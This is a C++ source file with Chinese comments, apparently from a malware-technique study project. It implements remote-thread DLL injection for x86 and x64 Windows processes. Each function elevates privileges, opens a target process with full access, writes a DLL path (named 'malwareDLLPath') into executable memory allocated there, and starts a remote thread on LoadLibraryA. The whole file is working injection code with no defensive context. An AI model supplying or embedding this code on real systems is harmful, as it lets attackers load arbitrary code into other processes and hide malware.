#include "stdafx.h"
/**
 * 远程线程DLL注入 (X86)
 * 参数   processName
 * 参数   malwareDLLPath
 */
void RemoteThreadInject_X86(TCHAR* processName, TCHAR* malwareDLLPath)
{
#if !MY_X86
	printf("错误：需编译为X86 \n");
	return;
#endif
	printf("\n开始远程线程DLL注入(X86)...\n");

	//提权,才能打开一些进程
	if (!upPrivileges())
	{
		return;
	}
	//打开目标进程
	HANDLE hDestProcess = MyOpenProcess_x86(processName, PROCESS_ALL_ACCESS);
	if (hDestProcess == 0)return;

	//获取当前进程中LoadLibraryA()函数地址
	HMODULE hKERNEL32 = GetModuleHandle(TEXT("KERNEL32.DLL"));
	LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32, TEXT("LoadLibraryA"));
	if (pLoadLibrary == 0)
	{
		printf("错误：获取当前进程LoadLibraryA()函数地址失败... \n");
		return;
	}
	//为DLL名称字符串申请足够大的空间(100字节)，并写入目标进程
	LPVOID remoteAddr = VirtualAllocEx(hDestProcess, NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteAddr == NULL)
	{
		printf("向目标进程申请空间失败，code=%d \n", GetLastError());
		return;
	}
	if (WriteProcessMemory(hDestProcess, (LPVOID)remoteAddr, (LPCVOID)malwareDLLPath, 100, OUT NULL) == 0)
	{
		DWORD CODE = GetLastError();
		printf("向目标进程写入DLL名称字符串失败,CODE=%d \n", CODE);
		getchar();
		return;
	}
	//创建远程线程，调用目标进程内的LoadLibrary函数
	DWORD remoteThreadID = 0;
	HANDLE hRemoteThread = CreateRemoteThread(hDestProcess, NULL, 0, pLoadLibrary, (LPVOID)remoteAddr, 0, OUT &remoteThreadID);
	if (hRemoteThread == NULL)
	{
		printf("创建远程线程失败,CODE=%d (注意需编译为64位才可注入64位进程)\n", GetLastError());
		return;
	}
	//等待远程线程结束
	printf("创建远程线程成功：等待LoadLibrary()结束...\n");
	WaitForSingleObject(hRemoteThread, INFINITE);
	DWORD exitCode = 666;
	GetExitCodeThread(hRemoteThread, OUT &exitCode);//线程退出码，即LoadLibrary函数返回值，即注入的模块基址
	if (exitCode == 0)
	{
		printf("远程线程退出码(即LoadLibrary返回的模块基址)=0，注入失败...\n");
		CloseHandle(hRemoteThread);
		return;
	}
	printf("远程线程退出码(即LoadLibrary返回的模块基址)= %08X", exitCode);
	CloseHandle(hRemoteThread);
	return;
}

// <summary>
//	远程线程DLL注入(64位) 
// </summary>
// <describe>
//	1.通过调用LoadLibrary进行DLL注入
//	2.某些进程无法注入：Win10计算器x64
// </describe>
// <param name="processName"></param>
// <param name="malwareDLLPath"></param>
void RemoteThreadInject_X64(TCHAR* processName, TCHAR* malwareDLLPath)
{
#if !MY_X64
	printf("错误：需编译为X64 \n");
	return;
#endif
	printf("\n开始远程线程DLL注入(X64)...\n");

	//提权,才能打开一些进程
	if (!upPrivileges())
	{
		return;
	}
	//打开目标进程
	HANDLE hDestProcess = MyOpenProcess_x64(processName, PROCESS_ALL_ACCESS);
	if (hDestProcess == 0)return;

	//获取当前进程中LoadLibraryA()函数地址
	HMODULE hKERNEL32 = GetModuleHandle(TEXT("KERNEL32.DLL"));
	LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32, TEXT("LoadLibraryA"));
	if (pLoadLibrary == 0)
	{
		printf("错误：获取当前进程LoadLibraryA()函数地址失败... \n");
		return;
	}
	//为DLL名称字符串申请足够大的空间(100字节)，并写入目标进程
	LPVOID remoteAddr = VirtualAllocEx(hDestProcess, NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteAddr == NULL)
	{
		printf("向目标进程申请空间失败，code=%d \n", GetLastError());
		return;
	}
	if (WriteProcessMemory(hDestProcess, (LPVOID)remoteAddr, (LPCVOID)malwareDLLPath, 100, OUT NULL) == 0)
	{
		DWORD CODE = GetLastError();
		printf("向目标进程写入DLL名称字符串失败,CODE=%d \n", CODE);
		getchar();
		return;
	}
	//创建远程线程，调用目标进程内的LoadLibrary函数(注入64位则需编译为64位，否则拒绝访问)
	DWORD remoteThreadID = 0;
	HANDLE hRemoteThread = CreateRemoteThread(hDestProcess, NULL, 0, pLoadLibrary, (LPVOID)remoteAddr, 0, OUT &remoteThreadID);
	if (hRemoteThread == NULL)
	{
		printf("创建远程线程失败,CODE=%d (注意需编译为64位才可注入64位进程)\n", GetLastError());
		return;
	}
	//等待远程线程结束
	printf("创建远程线程成功：等待LoadLibrary()结束...\n");
	WaitForSingleObject(hRemoteThread, INFINITE);
	DWORD exitCode = 666;
	GetExitCodeThread(hRemoteThread, OUT &exitCode);//线程退出码，即LoadLibrary函数返回值，即注入的模块基址
	if (exitCode == 0)
	{
		printf("远程线程退出码(即LoadLibrary返回的模块基址)=0，注入失败...\n");
		CloseHandle(hRemoteThread);
		return;
	}
	printf("远程线程退出码(即LoadLibrary返回的模块基址)= %08X", exitCode);
	CloseHandle(hRemoteThread);
	return;
}